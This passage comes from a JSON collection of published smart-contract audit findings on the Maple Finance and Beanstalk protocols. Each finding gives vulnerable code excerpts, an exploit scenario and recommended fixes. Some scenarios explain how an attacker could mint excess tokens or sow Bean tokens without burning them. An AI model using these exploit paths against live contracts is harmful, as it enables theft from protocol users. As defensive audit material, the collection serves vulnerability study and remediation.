MapleLoanInternals  delegatecall in _acceptNewTerms Exploit Scenario A token contract is destroyed. However, since all transfers of the destroyed token will succeed, all Maple protocol users can transact as though they have an unlimited balance of that token. If contract existence checks were executed before those transfers, all transfers of the destroyed token would revert. Recommendations Short term, add a contract existence check before each of the low-level calls mentioned above. Long term, add contract existence checks before all low-level CALL s, DELEGATECALL s, and STATICCALL s. These checks are inexpensive and add an important layer of defense. 23 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Missing zero checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "A number of constructors and functions in the codebase do not revert if zero is passed in for a parameter that should not be set to zero. The following parameters are not checked for the zero value:  Liquidator contract  constructor()  owner_  collateralAsset_  fundsAsset_  auctioneer_  destination_  setAuctioneer()  auctioneer_  MapleLoan contract  setBorrower()  borrower_  setLender()  lender_  MapleProxyFactory contract  constructor()  mapleGlobals_ If zero is passed in for one of those parameters, it will render the contract unusable, leaving its funds locked (and therefore eectively lost) and necessitating an expensive redeployment. For example, if there were a bug in the front end, MapleLoan.setBorrower could be called with address(0) , rendering the contract unusable and locking its funds in it. 24 Maple Labs The gas cost of checking a parameter for the zero value is negligible. Since the parameter is usually already on the stack, a zero check consists of a DUP opcode (3 gas) and an ISZERO opcode (3 gas). Given a high gas price of 200 gwei and an ether price of $4,200, a zero check would cost half a cent. Exploit Scenario A new version of the front end is deployed. A borrower suspects that the address currently used for his or her loan might have been compromised. As a precautionary measure, the borrower decides to transfer ownership of the loan to a new address. However, the new version of the front end contains a bug: the value of an uninitialized variable is used to construct the transaction. As a result, the borrower loses access to the loan contract, and to the collateral, forever. If zero checks had been in place, the transaction would have reverted instead. Recommendations Short term, add zero checks for the parameters mentioned above and for all other parameters for which zero is not an acceptable value. Long term, comprehensively validate all parameters. Avoid relying solely on the validation performed by front-end code, scripts, or other contracts, as a bug in any of those components could prevent it from performing that validation. Additionally, integrate Slither into the CI pipeline to automatically detect functions that lack zero checks. 25 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Lack of user-controlled limits for input amount in Liquidator.liquidatePortion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "The liquidatePortion function of the Liquidator contract computes the amount of funds that will be transferred from the caller to the liquidator contract. The computation uses an asset price retrieved from an oracle. There is no guarantee that the amount paid by the caller will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to liquidatePortion in the liquidator contract. EOAs that call the function cannot predict the return value of the oracle. If the caller is a contract, though, it can check the return value, with some eort. Adding an upper limit to the amount paid by the caller would enable the caller to explicitly state his or her assumptions about the execution of the contract and to avoid paying too much. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls liquidatePortion in the liquidator contract. Due to an oracle malfunction, the amount of her transfer to the liquidator contract is much higher than the amount she would pay for the collateral on another market. Recommendations Short term, introduce a maxReturnAmount parameter and add a require statement require(returnAmount <= maxReturnAmount) to enforce that parameter. 26 Maple Labs Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a contract and an upper limit for a transfer of the callers funds to a contract. 27 Maple Labs A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Attackers could mint more Fertilizer than intended due to an unused variable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "Due to an unused local variable, an attacker could mint more Fertilizer than should be allowed by the sale. The mintFertilizer() function checks that the _amount variable is no greater than the remaining variable; this ensures that more Fertilizer than intended cannot be minted; however, the _amount variable is not used in subsequent function callsinstead, the amount variable is used; the code eectively skips this check, allowing users to mint more Fertilizer than required to recapitalize the protocol. function mintFertilizer ( uint128 amount , uint256 minLP , LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256 (amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256 ( amount ).mul(1e6), msg.sender , mode ); uint128 id = LibFertilizer.addFertilizer( uint128 (s.season.current), amount , minLP ); C.fertilizer().beanstalkMint( msg.sender , uint256 (id), amount , s.bpf); } Figure 1.1: The mintFertilizer() function in FertilizerFacet.sol#L35- Note that this aw can be exploited only once: if users mint more Fertilizer than intended, the remainingRecapitalization() function returns 0 because the dollarPerUnripeLP() and unripeLP() . totalSupply() variables are constants. function remainingRecapitalization() internal view returns (uint256 remaining) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 totalDollars = C .dollarPerUnripeLP() .mul(C.unripeLP().totalSupply()) .div(DECIMALS); if (s.recapitalized >= totalDollars) return 0; return totalDollars.sub(s.recapitalized); Figure 1.2: The remainingRecapitalization() function in LibFertilizer.sol#L132-145 Exploit Scenario Recapitalization of the Beanstalk protocol is almost complete; only 100 units of Fertilizer for sale remain. Eve, a malicious user, calls mintFertilizer() with an amount of 10 million, signicantly over-funding the system. Because the Fertilizer supply increased signicantly above the theoretical maximum, other users are entitled to a much smaller yield than expected. Recommendations Short term, use _amount instead of amount as the parameter in the functions that are called after mintFertilizer() . Long term, thoroughly document the expected behavior of the FertilizerFacet contract and the properties (invariants) it should enforce, such as token amounts above the maximum recapitalization threshold cannot be sold. Expand the unit test suite to test that these properties hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of a two-step process for ownership transfer ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "The transferOwnership() function is used to change the owner of the Beanstalk protocol. This function calls the setContractOwner() function, which immediately sets the contracts new owner. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function transferOwnership ( address _newOwner ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.setContractOwner(_newOwner); } Figure 2.1: The transferOwnership() function in OwnershipFacet.sol#L13-16 Exploit Scenario The owner of the Beanstalk contracts is a community controlled multisignature wallet. The community agrees to upgrade to an on-chain voting system, but the wrong address is mistakenly provided to its call to transferOwnership() , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Possible underow could allow more Fertilizer than MAX_RAISE to be minted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "The remaining() function could underow, which could allow the Barn Raise to continue indenitely. Fertilizer is an ERC1155 token issued for participation in the Barn Raise, a community fundraiser intended to recapitalize the Beanstalk protocol with Bean and liquidity provider (LP) tokens that were stolen during the April 2022 governance hack. Fertilizer entitles holders to a pro rata portion of one-third of minted Bean tokens if the Fertilizer token is active, and it can be minted as long as the recapitalization target ($77 million) has not been reached. Users who want to buy Fertilizer call the mint() function and provide one USDC for each Fertilizer token they want to mint. function mint(uint256 amount) external payable nonReentrant { uint256 r = remaining(); if (amount > r) amount = r; __mint(amount); IUSDC.transferFrom(msg.sender, CUSTODIAN, amount); } Figure 3.1: The mint() function in FertilizerPremint.sol#L51-56 The mint() function rst checks how many Fertilizer tokens remain to be minted by calling the remaining() function (gure 3.2); if the user is trying to mint more Fertilizer than available, the mint() function mints all of the Fertilizer tokens that remain. function remaining() public view returns (uint256) { return MAX_RAISE - IUSDC.balanceOf(CUSTODIAN); } Figure 3.2: The remaining() function in FertilizerPremint.sol#L84- However, the FertilizerPremint contract does not use Solidity 0.8, so it does not have native overow and underow protection. As a result, if the amount of Fertilizer purchased reaches MAX_RAISE (i.e., 77 million), an attacker could simply send one USDC to the CUSTODIAN wallet to cause the remaining() function to underow, allowing the sale to continue indenitely. In this particular case, Beanstalk protocol funds are not at risk because all the USDC used to purchase Fertilizer tokens is sent to a Beanstalk community-owned multisignature wallet; however, users who buy Fertilizer after such an exploit would lose the gas funds they spent, and the project would incur further reputational damage. Exploit Scenario The Barn Raise is a total success: the MAX_RAISE amount is hit, meaning that 77 million Fertilizer tokens have been minted. Alice, a malicious user, notices the underow risk in the remaining() function; she sends one USDC to the CUSTODIAN wallet, triggering the underow and causing the function to return the maxuint256 instead of MAX_RAISE . As a result, the sale continues even though the MAX_RAISE amount was reached. Other users, not knowing that the Barn Raise should be complete, continue to successfully mint Fertilizer tokens until the bug is discovered and the system is paused to address the issue. While no Beanstalk funds are lost as a result of this exploit, the users who continued minting Fertilizer after the MAX_RAISE was reached lose all the gas funds they spent. Recommendations Short term, add a check in the remaining() function so that it returns 0 if USDC.balanceOf(CUSTODIAN) is greater than or equal to MAX_RAISE . This will prevent the underow from being triggered. Because the function depends on the CUSTODIAN s balance, it is still possible for someone to send USDC directly to the CUSTODIAN wallet and reduce the amount of available Fertilizer; however, attackers would lose their money in the process, meaning that there are no incentives to perform this kind of action. Long term, thoroughly document the expected behavior of the FertilizerPremint contract and the properties (invariants) it should enforce, such as no tokens can be minted once the MAX_RAISE is reached. Expand the unit test suite to test that these properties hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Risk of Fertilizer id collision that could result in loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "If a user mints Fertilizer tokens twice during two dierent seasons, the same token id for both tokens could be calculated, and the rst entry will be overridden; if this occurs and the bpf value changes, the user would be entitled to less yield than expected. To mint new Fertilizer tokens, users call the mintFertilizer() function in the FertilizerFacet contract. An id is calculated for each new Fertilizer token that is minted; not only is this id an identier for the token, but it also represents the endBpf period, which is the moment at which the Fertilizer reaches maturity and can be redeemed without incurring any penalty. function mintFertilizer( uint128 amount, uint256 minLP, LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256(amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256(amount).mul(1e6), msg.sender, mode ); uint128 id = LibFertilizer.addFertilizer( uint128(s.season.current), amount, minLP ); C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf); } Figure 4.1: The mintFertilizer() function in Fertilizer.sol#L35-55 The id is calculated by the addFertilizer() function in the LibFertilizer library as the sum of 1 and the bpf and humidity values. function addFertilizer( uint128 season, uint128 amount, uint256 minLP ) internal returns (uint128 id) { AppStorage storage s = LibAppStorage.diamondStorage(); uint256 _amount = uint256(amount); // Calculate Beans Per Fertilizer and add to total owed uint128 bpf = getBpf(season); s.unfertilizedIndex = s.unfertilizedIndex.add( _amount.mul(uint128(bpf)) ); // Get id id = s.bpf.add(bpf); [...] } function getBpf(uint128 id) internal pure returns (uint128 bpf) { bpf = getHumidity(id).add(1000).mul(PADDING); } function getHumidity(uint128 id) internal pure returns (uint128 humidity) { if (id == REPLANT_SEASON) return 5000; if (id >= END_DECREASE_SEASON) return 200; uint128 humidityDecrease = id.sub(REPLANT_SEASON + 1).mul(5); humidity = RESTART_HUMIDITY.sub(humidityDecrease); } Figure 4.2: The id calculation in LibFertilizer.sol#L32-67 However, the method that generates these token id s does not prevent collisions. The bpf value is always increasing (or does not move), and humidity decreases every season until it reaches 20%. This makes it possible for a user to mint two tokens in two dierent seasons with dierent bpf and humidity values and still get the same token id . function beanstalkMint(address account, uint256 id, uint128 amount, uint128 bpf) external onlyOwner { _balances[id][account].lastBpf = bpf; _safeMint( account, id, amount, bytes('0') ); } Figure 4.3: The beanstalkMint() function in Fertilizer.sol#L40-48 An id collision is not necessarily a problem; however, when a token is minted, the value of the lastBpf eld is set to the bpf of the current season, as shown in gure 4.3. This eld is very important because it is used to determine the penalty, if any, that a user will incur when redeeming Fertilizer. To redeem Fertilizer, users call the claimFertilizer() function, which in turn calls the beanstalkUpdate() function on the Fertilizer contract. function claimFertilized(uint256[] calldata ids, LibTransfer.To mode) external payable { } uint256 amount = C.fertilizer().beanstalkUpdate(msg.sender, ids, s.bpf); LibTransfer.sendToken(C.bean(), amount, msg.sender, mode); Figure 4.4: The claimFertilizer() function in FertilizerFacet.sol#L27-33 function beanstalkUpdate( address account, uint256[] memory ids, uint128 bpf ) external onlyOwner returns (uint256) { return __update(account, ids, uint256(bpf)); } function __update( address account, uint256[] memory ids, uint256 bpf ) internal returns (uint256 beans) { for (uint256 i = 0; i < ids.length; i++) { uint256 stopBpf = bpf < ids[i] ? bpf : ids[i]; uint256 deltaBpf = stopBpf - _balances[ids[i]][account].lastBpf; if (deltaBpf > 0) { beans = beans.add(deltaBpf.mul(_balances[ids[i]][account].amount)); _balances[ids[i]][account].lastBpf = uint128(stopBpf); } } emit ClaimFertilizer(ids, beans); } Figure 4.5: The update ow in Fertilizer.sol#L32-38 and L72-86 The beanstalkUpdate() function then calls the __update() function. This function rst calculates the stopBpf value, which is one of two possible values. If the Fertilizer is being redeemed early, stopBpf is the bpf at which the Fertilizer is being redeemed; if the token is being redeemed at maturity or later, stopBpf is the token id (i.e., the endBpf value). Afterward, __update() calculates the deltaBpf value, which is used to determine the penalty, if any, that the user will incur when redeeming the token; deltaBpf is calculated using the stopBpf value that was already dened and the lastBpf value, which is the bpf corresponding to the last time the token was redeemed or, if it was never redeemed, the bpf at the moment the token was minted. Finally, the tokens lastBpf eld is updated to the stopBpf . Because of the id collision, users could accidentally mint Fertilizer tokens with the same id in two dierent seasons and override their rst mints lastBpf eld, ultimately reducing the amount of yield they are entitled to. Exploit Scenario Imagine the following scenario:   It is currently the rst season; the bpf is 0 and the humidity is 40%. Alice mints 100 Fertilizer tokens with an id of 41 (the sum of 1 and the bpf ( 0 ) and humidity ( 40 ) values), and lastBpf is set to 0 . Some time goes by, and it is now the third season; the bpf is 35 and the humidity is 5%. Alice mints one additional Fertilizer token with an id of 41 (the sum of 1 and the bpf ( 35 ) and humidity ( 5 ) values), and lastBpf is set to 35 . Because of the second mint, the lastBpf eld of Alices Fertilizer tokens is overridden, making her lose a substantial amount of the yield she was entitled to:  Using the formula for calculating the number of BEAN tokens that users are entitled to, shown in gure 4.5, Alices original yield at maturity would have been 4,100 tokens:  deltaBpf = id - lastBpf = 41 - 0 = 41  balance = 100  beans received = deltaBpf * balance = 41 * 100 = 4100  As a result of the overridden lastBpf eld, Alices yield instead ends up being only 606 tokens:  deltaBpf = id - lastBpf = 41 - 35 = 6  balance = 101  beans received = deltaBpf * balance = 6 * 101 = 606 Recommendations Short term, separate the role of the id into two separate variables for the token index and endBpf . That way, the index can be optimized to prevent collisions, while endBpf can accurately represent the data it needs to represent. Alternatively, modify the relevant code so that when an id collision occurs, it either reverts or redeems the previous Fertilizer rst before minting the new tokens. However, these alternate remedies could introduce new edge cases or could result in a degraded user experience; if either alternate remedy is implemented, it would need to be thoroughly documented to inform the users of its particular behavior. Long term, thoroughly document the expected behavior of the associated code and include regression tests to prevent similar issues from being introduced in the future. Additionally, exercise caution when using one variable to serve two purposes. Gas savings should be measured and weighed against the increased complexity. Developers should be aware that performing optimizations could introduce new edge cases and increase the codes complexity.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. The sunrise() function rewards callers only with the base incentive ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "The increasing incentive that encourages users to call the sunrise() function in a timely manner is not actually applied. According to the Beanstalk white paper, the reward paid to users who call the sunrise() function should increase by 1% every second (for up to 300 seconds) after this method is eligible to be called; this incentive is designed so that, even when gas prices are high, the system can move on to the next season in a timely manner. This increasing incentive is calculated and included in the emitted logs, but it is not actually applied to the number of Bean tokens rewarded to users who call sunrise() . function incentivize ( address account , uint256 amount ) private { uint256 timestamp = block.timestamp .sub( s.season.start.add(s.season.period.mul(season())) ); if (timestamp > 300 ) timestamp = 300 ; uint256 incentive = LibIncentive.fracExp(amount, 100 , timestamp, 1 ); C.bean().mint(account, amount ); emit Incentivization(account, incentive ); } Figure 5.1: The incentive calculation in SeasonFacet.sol#70-78 Exploit Scenario Gas prices suddenly increase to the point that it is no longer protable to call sunrise() . Given the lack of an increasing incentive, the function goes uncalled for several hours, preventing the system from reacting to changing market conditions. Recommendations Short term, pass the incentive value instead of amount into the mint() function call. Long term, thoroughly document the expected behavior of the SeasonFacet contract and the properties (invariants) it should enforce, such as the caller of the sunrise() function receives the right incentive. Expand the unit test suite to test that these properties hold. Additionally, thoroughly document how the system would be aected if the sunrise() function were not called for a long period of time (e.g., in times of extreme network congestion). Finally, determine whether the Beanstalk team should rely exclusively on third parties to call the sunrise() function or whether an alternate system managed by the Beanstalk team should be adopted in addition to the current system. For example, an alternate system could involve an o-chain monitoring system and a trusted execution ow.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "Beanstalk has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Beanstalk contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of support for external transfers of nonstandard ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "For external transfers of nonstandard ERC20 tokens via the TokenFacet contract, the code uses the standard transferFrom operation from the given token contract without checking the operations returndata ; as a result, successfully executed transactions that fail to transfer tokens will go unnoticed, causing confusion in users who believe their funds were successfully transferred. The TokenFacet contract exposes transferToken() , an external function that users can call to transfer ERC20 tokens both to and from the contract and between users. function transferToken( IERC20 token, address recipient, uint256 amount, LibTransfer.From fromMode, LibTransfer.To toMode ) external payable { LibTransfer.transferToken(token, recipient, amount, fromMode, toMode); } Figure 7.1: The transferToken() function in TokenFacet.sol#L39-47 This function calls the LibTransfer library, which handles the token transfer. function transferToken( IERC20 token, address recipient, uint256 amount, From fromMode, To toMode ) internal returns (uint256 transferredAmount) { if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) { token.transferFrom(msg.sender, recipient, amount); return amount; } amount = receiveToken(token, amount, msg.sender, fromMode); sendToken(token, amount, recipient, toMode); return amount; } Figure 7.2: The transferToken() function in LibTransfer.sol#L29-43 The LibTransfer library uses the fromMode and toMode values to determine a transfers sender and receiver, respectively; in most cases, it uses the safeERC20 library to execute transfers. However, if fromMode and toMode are both marked as EXTERNAL , then the transferFrom function of the token contract will be called directly, and safeERC20 will not be used. Essentially, if a user tries to transfer a nonstandard ERC20 token that does not revert on failure and instead indicates a transactions success or failure in its return data, the user could be led to believe that failed token transfers were successful. Exploit Scenario Alice uses the TokenFacet contract to transfer nonstandard ERC20 tokens that return false on failure to another contract. However, Alice accidentally inputs an amount higher than her balance. The transaction is successfully executed, but because there is no check of the false return value, Alice does not know that her tokens were not transferred. Recommendations Short term, use the safeERC20 library for external token transfers. Long term, thoroughly review and document all interactions with arbitrary tokens to prevent similar issues from being introduced in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Plot transfers from users with allowances revert if the owner has an existing pod listing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "Whenever a plot transfer is executed by a user with an allowance (i.e., a transfer in which the caller was approved by the plots owner), the transfer will revert if there is an existing listing for the pods contained in that plot. The MarketplaceFacet contract exposes a function, transferPlot() , that allows the owner of a plot to transfer the pods in that plot to another user; additionally, the owner of a plot can call the approvePods() function (gure 8.1) to approve other users to transfer these pods on the owners behalf. function approvePods(address spender, uint256 amount) external payable nonReentrant { } require(spender != address(0), \"Field: Pod Approve to 0 address.\"); setAllowancePods(msg.sender, spender, amount); emit PodApproval(msg.sender, spender, amount); Figure 8.1: The approvePods() function in MarketplaceFacet.sol#L147-155 Once approved, the given address can call the transferPlot() function to transfer pods on the owners behalf. The function checks and decreases the allowance and then checks whether there is an existing pod listing for the target pods. If there is an existing listing, the function tries to cancel it by calling the _cancelPodListing() function. function transferPlot( address sender, address recipient, uint256 id, uint256 start, uint256 end ) external payable nonReentrant { require( sender != address(0) && recipient != address(0), \"Field: Transfer to/from 0 address.\" ); uint256 amount = s.a[sender].field.plots[id]; require(amount > 0, \"Field: Plot not owned by user.\"); require(end > start && amount >= end, \"Field: Pod range invalid.\"); amount = end - start; // Note: SafeMath is redundant here. if ( msg.sender != sender && allowancePods(sender, msg.sender) != uint256(-1) ) { decrementAllowancePods(sender, msg.sender, amount); } if (s.podListings[id] != bytes32(0)) { _cancelPodListing(id); // TODO: Look into this cancelling. } _transferPlot(sender, recipient, id, start, amount); } Figure 8.2: The transferPlot() function in MarketplaceFacet.sol#L119-145 The _cancelPodListing() function receives only an id as the input and relies on the msg.sender to determine the listings owner. However, if the transfer is executed by a user with an allowance, the msg.sender is the user who was granted the allowance, not the owner of the listing. As a result, the function will revert. function _cancelPodListing(uint256 index) internal { require( s.a[msg.sender].field.plots[index] > 0, \"Marketplace: Listing not owned by sender.\" ); delete s.podListings[index]; emit PodListingCancelled(msg.sender, index); } Figure 8.3: The _cancelPodListing() function in Listing.sol#L149-156 Exploit Scenario A new smart contract that integrates with the MarketplaceFacet contract is deployed. This contract has features allowing it to manage users pods on their behalf. Alice approves the contract so that it can manage her pods. Some time passes, and Alice calls one of the smart contracts functions, which requires Alice to transfer ownership of her plot to the contract. Because Alice has already approved the smart contract, it can perform the transfer on her behalf. To do so, it calls the transferPlot() function in the MarketplaceFacet contract; however, this call reverts because Alice has an open listing for the pods that the contract is trying to transfer. Recommendations Short term, add a new input to _cancelPodListing() that is equal to msg.sender if the caller is the owner of the listing, but equal to the pod owner if the caller is a user who was approved by the owner. Long term, thoroughly document the expected behavior of the MarketplaceFacet contract and the properties (invariants) it should enforce, such as plot transfers initiated by users with an allowance cancel the owners listing. Expand the unit test suite to test that these properties hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Users can sow more Bean tokens than are burned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "An accounting error allows users to sow more Bean tokens than the available soil allows. Whenever the price of Bean is below its peg, the protocol issues soil. Soil represents the willingness of the protocol to take Bean tokens o the market in exchange for a pod. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as non-callable bonds that mature on a rst-in-rst-out (FIFO) basis as the protocol issues new Bean tokens. Whenever soil is available, users can call the sow() and sowWithMin() functions in the FieldFacet contract. function sowWithMin( uint256 amount, uint256 minAmount, LibTransfer.From mode ) public payable returns (uint256) { uint256 sowAmount = s.f.soil; require( sowAmount >= minAmount && amount >= minAmount && minAmount > 0, \"Field: Sowing below min or 0 pods.\" ); if (amount < sowAmount) sowAmount = amount; return _sow(sowAmount, mode); } Figure 9.1: The sowWithMin() function in FieldFacet.sol#L41-53 The sowWithMin() function ensures that there is enough soil to sow the given number of Bean tokens and that the call will not sow fewer tokens than the specied minAmount . Once it makes these checks, it calls the _sow() function. function _sow(uint256 amount, LibTransfer.From mode) internal returns (uint256 pods) { pods = LibDibbler.sow(amount, msg.sender); if (mode == LibTransfer.From.EXTERNAL) C.bean().burnFrom(msg.sender, amount); else { amount = LibTransfer.receiveToken(C.bean(), amount, msg.sender, mode); C.bean().burn(amount); } } Figure 9.2: The _sow() function in FieldFacet.sol#L55-65 The _sow() function rst calculates the number of pods that will be sown by calling the sow() function in the LibDibbler library, which performs the internal accounting and calculates the number of pods that the user is entitled to. function sow(uint256 amount, address account) internal returns (uint256) { AppStorage storage s = LibAppStorage.diamondStorage(); // We can assume amount <= soil from getSowAmount s.f.soil = s.f.soil - amount ; return sowNoSoil(amount, account); } function sowNoSoil(uint256 amount, address account) internal returns (uint256) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 pods = beansToPods(amount, s.w.yield); sowPlot(account, amount, pods); s.f.pods = s.f.pods.add(pods) ; saveSowTime(); return pods; function sowPlot( address account, uint256 beans, uint256 pods ) private { AppStorage storage s = LibAppStorage.diamondStorage(); s.a[account].field.plots[s.f.pods] = pods; emit Sow(account, s.f.pods, beans, pods); } Figure 9.3: The sow() , sowNoSoil() , and sowPlot() functions in LibDibbler.sol#L41-53 Finally, the sowWithMin() function burns the Bean tokens from the callers account, removing them from the supply. To do so, the function calls burnFrom() if the mode parameter is EXTERNAL (i.e., if the Bean tokens to be burned are not escrowed in the contract) and burn() if the Bean tokens are escrowed. If the mode parameter is not EXTERNAL , the receiveToken() function is executed to update the internal accounting of the contract before burning the tokens. This function returns the number of tokens that were transferred into the contract. In essence, the receiveToken() function allows the contract to correctly account for token transfers into it and to manage internal balances without performing token transfers. function receiveToken( IERC20 token, uint256 amount, address sender, From mode ) internal returns (uint256 receivedAmount) { if (amount == 0) return 0; if (mode != From.EXTERNAL) { receivedAmount = LibBalance.decreaseInternalBalance( sender, token, amount, mode != From.INTERNAL ); if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT) return receivedAmount; } token.safeTransferFrom(sender, address(this), amount - receivedAmount); return amount; } Figure 9.4: The receiveToken() function in FieldFacet.sol#L41-53 However, if the mode parameter is INTERNAL_TOLERANT , the contract allows the user to partially ll amount (i.e., to transfer as much as the user can), which means that if the user does not own the given amount of Bean tokens, the protocol simply burns as many tokens as the user owns but still allows the user to sow the full amount . Exploit Scenario Eve, a malicious user, spots the vulnerability in the FieldFacet contract and waits until Bean is below its peg and the protocol starts issuing soil. Bean nally goes below its peg, and the protocol issues 1,000 soil. Eve deposits a single Bean token into the contract by calling the transferToken() function in the TokenFacet contract. She then calls the sow() function with amount equal to 1000 and mode equal to INTERNAL_TOLERANT . The sow() function is executed, sowing 1,000 Bean tokens but burning only a single token. Recommendations Short term, modify the relevant code so that users Bean tokens are burned before the accounting for the soil and pods are updated and so that, if the mode eld is not EXTERNAL , the amount returned by receiveToken() is used as the input to LibDibbler.sow() . Long term, thoroughly document the expected behavior of the FieldFacet contract and the properties (invariants) it should enforce, such as the sow() function always sows as many Bean tokens as were burned. Expand the unit test suite to test that these properties hold.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Pods may never ripen ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "Whenever the price of Bean is below its peg, the protocol takes Bean tokens o the market in exchange for a number of p ods dependent on the current interest rate. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as loans that are repaid on a FIFO basis as the protocol issues new Bean tokens. A group of pods that are created together is called a plot. The queue of plots is referred to as the pod line. The pod line has no practical bound on its length, so during periods of decreasing demand, it can grow indenitely. No yield is awarded until the given plot owner is rst in line and until the price of Bean is above its value peg. While the protocol does not default on its debt, the only way for pods to ripen is if demand increases enough for the price of Bean to be above its value peg for some time. While the price of Bean is above its peg, a portion of newly minted Bean tokens is used to repay the rst plot in the pod line until fully repaid, decreasing the length of the pod line. During an extended period of decreasing supply, the pod line could grow long enough that lenders receive an unappealing time-weighted rate of return, even if the yield is increased; a suciently long pod line could encourage usersuncertain of whether future demand will grow enough for them to be repaidto sell their Bean tokens rather than lending them to the protocol. Under such circumstances, the protocol will be unable to disincentivize Bean market sales, disrupting its ability to return Bean to its value peg. Exploit Scenario Bean goes through an extended period of increasing demand, overextending its supply. Then, demand for Bean tokens slowly and steadily declines, and the pod line grows in length. At a certain point, some users decide that their time-weighted rate of return is unfavorable or too uncertain despite the promised high yields. Instead of lending their Bean tokens to the protocol, they sell. Recommendations Explore options for backing Bean s value with an oer that is guaranteed to eventually be fullled. 11. Bean and the o\u0000er backing it are strongly correlated Severity: Undetermined Diculty: Undetermined Type: Economic Finding ID: TOB-BEANS-011 Target: The Beanstalk protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. Ability to whitelist assets uncorrelated with Bean price, misaligning governance incentives ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
